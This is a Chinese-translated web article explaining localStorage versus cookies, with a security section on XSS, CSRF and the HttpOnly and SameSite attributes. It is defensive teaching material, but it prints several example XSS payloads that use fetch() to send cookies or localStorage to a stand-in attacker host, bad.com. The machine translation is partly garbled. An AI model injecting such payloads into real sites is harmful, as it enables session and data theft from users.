<html>
<head>
<title>Local Storage vs Cookies: Where to securely store data on the client-side?</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">本地存储与Cookies:在客户端哪里安全地存储数据？</h1>
<blockquote>原文：<a href="https://javascript.plainenglish.io/local-storage-vs-cookies-where-to-securely-store-data-on-the-client-side-de37bf050ca5?source=collection_archive---------12-----------------------#2022-06-07">https://javascript.plainenglish.io/local-storage-vs-cookies-where-to-securely-store-data-on-the-client-side-de37bf050ca5?source=collection_archive---------12-----------------------#2022-06-07</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><figure class="gl gn jl jm jn jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi jk"><img src="../Images/ff92cff6ec9f6df345b876448013daba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NM9-qBQ-tvncS67AhEX18g.png"/></div></div></figure><p id="7d11" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">在客户端哪里存储数据？Cookies还是本地存储？哪个更适合缓存，哪个更持久？哪个更安全，哪个容易受到<a class="ae kt" href="https://medium.com/@akshaydagar98/xss-attacks-for-beginners-and-how-to-defend-against-them-79347514488a" rel="noopener"> XSS </a>和<a class="ae kt" href="https://owasp.org/www-community/attacks/csrf" rel="noopener ugc nofollow" target="_blank"> CSRF </a>的攻击？在哪里存放您的JWT访问令牌？在这篇文章中找到答案！</p><p id="e940" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">首先，让我们讨论它们是什么，并检查它们的优点和缺点:</p><p id="dfa8" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">网络存储API:</strong></p><p id="c3a3" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">本地存储和会话存储，统称为Web存储API，提供了在浏览器中存储<em class="ku"> key: value </em>对的机制，并被视为cookiess的替代方案，cookie早期用于在浏览器中存储应用程序数据。许多应用程序使用这些来缓存数据以实现更快的访问，或者存储和持久化重要信息，如授权令牌或其他数据。</p><p id="19cc" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">会话存储保存数据直到浏览器选项卡或会话关闭，本地存储保存数据直到被用户或代码手动删除。除此之外，本地和会话存储是相同的。以下是如何使用它们:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="05b5" class="le lf in la b gy lg lh l li lj">localStorage.setItem(key, value);        //set value with key<br/>localStorage.getItem(key);               //get value with key<br/>localStorage.removeItem(key);            //remove the key value pair</span></pre><p id="8739" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">键和值必须是字符串。localStorage本身是一个简单的JavaScript对象。</p><p id="4533" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">饼干:</strong></p><p id="f598" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">HTTP cookie是一个字符串，像本地和会话存储一样存储在浏览器中。Cookie由web服务器创建并发送给客户端，作为HTTP响应的一部分，包括"<em class="ku"> Set-Cookie" </em>头:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="9a02" class="le lf in la b gy lg lh l li lj">Set-Cookie: key=value</span></pre><p id="5baa" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">然后，客户端的浏览器存储这个cookie(作为一个key=value对的字符串),并在每个后续的HTTP请求中将其发送给服务器。这些可以用来维护HTTP通信的客户端状态(比如会话信息)，这是无状态的。</p><p id="94cd" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">请注意，cookies也可以从客户端添加。按f12打开开发人员工具，导航到控制台并执行以下代码:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="6ec2" class="le lf in la b gy lg lh l li lj">document.cookie = "mykey=myvalue"</span></pre><p id="e5f5" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">现在转到应用程序选项卡-&gt; cookie，您将能够在您的cookie中看到mykey=myvalue。在web存储API发明之前，许多开发人员利用这一点在浏览器中持久存储或缓存数据。</p></div><div class="ab cl lk ll hr lm" role="separator"><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp"/></div><div class="ig ih ii ij ik"><h1 id="0c01" class="lr lf in bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated"><strong class="ak">本地存储与用于存储、持久化和缓存数据的cookie:</strong></h1><p id="cf7c" class="pw-post-body-paragraph jv jw in jx b jy mo ka kb kc mp ke kf kg mq ki kj kk mr km kn ko ms kq kr ks ig bi translated"><strong class="jx io">持久性:</strong>本地存储没有到期时间。它必须由用户删除或使用localStorage.removeItem()函数删除。Cookies有两种类型:</p><ul class=""><li id="52d9" class="mt mu in jx b jy jz kc kd kg mv kk mw ko mx ks my mz na nb bi translated"><strong class="jx io">会话Cookies</strong>:这些cookie会持续到浏览器会话结束。</li><li id="c19c" class="mt mu in jx b jy nc kc nd kg ne kk nf ko ng ks my mz na nb bi translated"><strong class="jx io">永久Cookies </strong>:在<em class="ku">Expires</em>属性<em class="ku">指定的日期和时间删除。</em></li></ul><p id="01f5" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">大小:</strong>本地存储(每个域5 MB)比cookies(每个域4 KB)大得多。</p><p id="82d3" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">数据类型:</strong>本地存储是可以存储key: value (string，string)对的对象。如果你想存储JSON数据，你必须先把它转换成字符串，幸好有一个简单的方法可以做到这一点:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="e8c1" class="le lf in la b gy lg lh l li lj">//object to string and store<br/>JSON.stringify(object_to_be_stored)    </span><span id="a527" class="le lf in la b gy nh lh l li lj">//stored string back to object<br/>JSON.parse(string_value_from_local_storage)</span></pre><p id="c965" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">cookie是这种格式的字符串:<em class="ku">“key 1 = value 1；key2 = value2"</em>。要访问它，使用<em class="ku"> document.cookie，</em>然而，要获得一个特定的键值对，您必须解析这个字符串。</p><p id="7ba6" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">还要记住，将数据存储在cookies中意味着它将随每个HTTP请求一起发送，从而浪费带宽。这就是为什么cookie的大小被限制为4 KB。</p></div><div class="ab cl lk ll hr lm" role="separator"><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp"/></div><div class="ig ih ii ij ik"><h1 id="1bd6" class="lr lf in bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated"><strong class="ak">安全:</strong></h1><p id="786e" class="pw-post-body-paragraph jv jw in jx b jy mo ka kb kc mp ke kf kg mq ki kj kk mr km kn ko ms kq kr ks ig bi translated">现在最重要的讨论来了:哪个更安全，哪个能被偷？让我们以XSS和CSRF攻击为背景来看看这一点，这些攻击是窃取信息和在客户端执行恶意操作的常见方式。</p><p id="9129" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">跨站脚本(XSS)攻击是一种注入式攻击，在这种攻击中，恶意脚本可能被注入到文档中并被执行。<a class="ae kt" href="https://medium.com/@akshaydagar98/xss-attacks-for-beginners-and-how-to-defend-against-them-79347514488a" rel="noopener">这里有一篇短文总结了这类攻击以及如何防范它们</a>。</p><p id="0856" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><a class="ae kt" href="https://owasp.org/www-community/attacks/csrf" rel="noopener ugc nofollow" target="_blank">跨站点请求伪造(CSRF) </a>是一种攻击模式，攻击者欺骗受害者向他们已经通过身份验证的站点发送恶意请求，以执行不想要的操作。由于浏览器会自动在HTTP请求中包含某些信息，如cookies和IP地址，因此易受攻击网站的服务器可能无法区分受害者被操纵发送的伪造请求和真实请求。</p><p id="9c7b" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io"> Cookies </strong>易受XSS(跨站点脚本)和CSRF(跨站点请求伪造)攻击，但有办法减轻它们。</p><p id="8240" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">让我们看看一个恶意代理如何通过将以下脚本注入到您的网站(XSS)来窃取属于特定域的cookies。从今以后，我将把您的网站(易受攻击的网站)称为“<strong class="jx io"><em class="ku"/></strong><em class="ku">”</em>，把攻击者的网站(恶意网站)称为<em class="ku">”</em><strong class="jx io"><em class="ku">bad.com</em></strong><em class="ku"/>:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="0618" class="le lf in la b gy lg lh l li lj">&lt;script&gt;fetch("http://www.bad.com?stolenGoods=" + document.cookie)&lt;/script&gt;</span></pre><p id="4335" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">如果这个脚本被您的文档执行，它会将您网站上用户的cookie(<em class="ku">good.com)</em>连同请求一起发送到攻击者的域(<em class="ku">bad.com</em>)，然后攻击者可以使用它来冒充<em class="ku">good.com</em>上的用户，或者获取您作为cookie的一部分存储的用户数据。</p><p id="9a89" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">但是，cookies中内置了一些机制来减轻此类攻击:</p><p id="0b9a" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io"> HttpOnly </strong>:在服务器上设置cookie头时，可以将cookie指定为HttpOnly。这将阻止使用“<em class="ku">document . cookie”</em>或任何其他javascript代码访问cookie:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="5086" class="le lf in la b gy lg lh l li lj">Set-Cookie: id=xyz; HttpOnly</span></pre><p id="0226" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">请注意，将cookie设置为HttpOnly将使客户端javascript无法访问它，因此您不能为您在客户端创建的cookie设置该属性，这意味着它们仍然是不安全的，容易受到XSS的攻击！服务器设置的cookies呢？</p><p id="39a2" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">有一种误解认为将cookie设置为HttpOnly可以防止它通过XSS攻击被窃取。虽然这阻止了javascript访问您的cookie，但是您必须记住，cookie总是作为报头与每个HTTP请求一起发送。这意味着攻击者仍然可以通过简单地向自己的服务器发送请求，从易受攻击的网站(【good.com】T4)(其中有一个XSS脚本在执行)访问用户的cookie。cookie将自动作为请求标题包含在内！！！</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="1111" class="le lf in la b gy lg lh l li lj">&lt;script&gt;fetch("http://www.bad.com")&lt;/script&gt;<br/>// the cookie will be there as part of the request header and bad.com's server can then access it</span></pre><p id="7858" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">谢天谢地，有一种方法可以防止这种情况发生。</p><p id="e017" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io"> SameSite </strong>:这个cookie属性指定了cookie是否/何时随跨站点请求一起发送的规则。</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="7008" class="le lf in la b gy lg lh l li lj">Set-Cookie: key=val; HttpOnly; SameSite=Strict<br/>// the cookie will only be sent with http requests to the same site where it originated. good.com's cookies won't be sent in requests to bad.com</span><span id="8238" class="le lf in la b gy nh lh l li lj">Set-Cookie: key=val; HttpOnly; SameSite=Lax<br/>// same as Strict, but cookie will also be sent if request to the site originates from another site.</span></pre><p id="5ee6" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">注意，由于SameSite = Lax，CSRF攻击有可能利用这一点。<em class="ku">bad.com</em>可以向<em class="ku">good.com</em>发送一个请求，cookie将包含在该请求中(即使<em class="ku">bad.com</em>本身无法读取cookie)。</p><p id="d1ed" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">本地存储</strong>也容易受到XSS攻击，但不会受到CSRF攻击。<strong class="jx io">本地存储只能在同一个域上访问</strong>。没有简单的方法来防止本地存储数据被XSS攻击窃取。与cookies不同，没有任何属性可以阻止通过javascript访问本地存储(如果有，那就违背了本地存储的全部目的)。</p><p id="a7d9" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">因此，如下所示的XSS脚本可以窃取<em class="ku">good.com</em>上的本地存储数据，并将其发送到<em class="ku">bad.com</em>:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="eceb" class="le lf in la b gy lg lh l li lj">&lt;script&gt;fetch("http://www.bad.com?stolenGoods=window.localStorage")&lt;/script&gt;</span></pre><p id="dc6b" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">那么这是否意味着cookies在浏览器上存储数据比本地存储更安全呢？的确，我们可以严格限制读取cookies的能力，只允许good.com的服务器读取，而本地存储数据可以被攻击者通过XSS攻击访问。</p><p id="96e8" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">请注意，这只适用于服务器设置的cookies。如果您想通过以下方式将用户的信用卡信息作为cookie添加到浏览器中进行缓存，它将像本地存储数据一样容易受到XSS攻击，因为您不能将其设置为HttpOnly:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="304f" class="le lf in la b gy lg lh l li lj">document.cookie = "creditCardNumber=XXXXXXXXXX; HttpOnly"<br/>//won't work</span><span id="9fb3" class="le lf in la b gy nh lh l li lj">document.cookie = "creditCardNumber=XXXXXXXXXX;"<br/>//works but can be accessed by JavaScript, hence vulnerable to XSS</span></pre></div><div class="ab cl lk ll hr lm" role="separator"><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp lq"/><span class="ln bw bk lo lp"/></div><div class="ig ih ii ij ik"><p id="dccf" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">为了总结安全性讨论，让我们看看应该使用什么来在客户端存储和缓存数据，以及应该在哪里存储只需要由服务器访问的数据，如auth令牌:</p><p id="cb68" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">在客户端存储数据</strong>(用于缓存或持久化):您可以使用两个选项中的任何一个，因为它们都是同等安全的(或者说，同等不安全)。本地存储数据不能跨站点访问，cookies也可以使用<em class="ku"> SameSite=strict，</em>进行限制，但它们都可以通过JavaScript访问，因此容易受到XSS的攻击，如果不是CSRF的话。</p><p id="5814" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">本地(或会话)存储更可取，因为它的大小更大(对于cookies是5 MB对4 KB ),并且它不随每个HTTP请求一起发送，因此节省了带宽。</p><p id="27f1" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io">为服务器端</strong>(如JWTs)存储会话信息:服务器设置这些cookie，因此将它们标记为HttpOnly将防止客户端JavaScript访问它们，用<em class="ku"> SameSite=strict </em>标记它们将不会允许这些cookie被发送到其他域，从而防止通过XSS或CSRF攻击的操纵。</p><p id="8f68" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">另一方面，存储在本地存储器中的授权令牌可以通过XSS攻击被窃取。此外，cookies会随请求自动发送，而对于本地存储中的令牌，您必须编写代码来手动设置HTTP请求的授权头。因此，Cookies更适合这种情况。</p><p id="a934" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">此外，请注意，如果您的网站容易受到XSS攻击，没有什么是真正安全的。恶意脚本可以向<em class="ku"> good.com的</em>服务器发送请求(cookie会被自动收录，尽管如果是HttpOnly脚本无法读取)，然后通过另一个HTTP请求将<em class="ku">good.com</em>的响应发送到<em class="ku"> bad.com的</em>服务器。因此，如果您的站点容易受到javascript注入攻击，它就完了！<a class="ae kt" href="https://medium.com/@akshaydagar98/xss-attacks-for-beginners-and-how-to-defend-against-them-79347514488a" rel="noopener">在这里，您可以找到更多关于如何防止此类攻击的信息</a>。</p><p id="119e" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated">请记住，在客户端没有什么是绝对安全的！</p><p id="a1aa" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><em class="ku">更多内容请看</em> <a class="ae kt" href="https://plainenglish.io/" rel="noopener ugc nofollow" target="_blank"> <strong class="jx io"> <em class="ku">说白了就是</em> </strong> </a> <em class="ku">。</em></p><p id="73ed" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><em class="ku">报名参加我们的</em> <a class="ae kt" href="http://newsletter.plainenglish.io/" rel="noopener ugc nofollow" target="_blank"> <strong class="jx io"> <em class="ku">免费周报</em> </strong> </a> <em class="ku">。关注我们上</em> <a class="ae kt" href="https://twitter.com/inPlainEngHQ" rel="noopener ugc nofollow" target="_blank"> <strong class="jx io"> <em class="ku">推特</em> </strong> </a>，<a class="ae kt" href="https://www.linkedin.com/company/inplainenglish/" rel="noopener ugc nofollow" target="_blank"> <strong class="jx io"> <em class="ku">领英</em> </strong> </a> <strong class="jx io"> <em class="ku">，</em></strong><a class="ae kt" href="https://www.youtube.com/channel/UCtipWUghju290NWcn8jhyAw" rel="noopener ugc nofollow" target="_blank"><strong class="jx io"><em class="ku">YouTube</em></strong></a><strong class="jx io"><em class="ku">，以及</em></strong><em class="ku"/><a class="ae kt" href="https://discord.gg/GtDtUAvyhW" rel="noopener ugc nofollow" target="_blank"><strong class="jx io"><em class="ku">不和</em> </strong> </a>T47】</p><p id="037c" class="pw-post-body-paragraph jv jw in jx b jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks ig bi translated"><strong class="jx io"> <em class="ku">用</em> </strong> <a class="ae kt" href="https://circuit.ooo/?utm=publication-post-cta" rel="noopener ugc nofollow" target="_blank"> <strong class="jx io"> <em class="ku">电路</em> </strong> </a> <em class="ku">为你的科技创业建立认知和采用。</em></p></div></div>    
</body>
</html>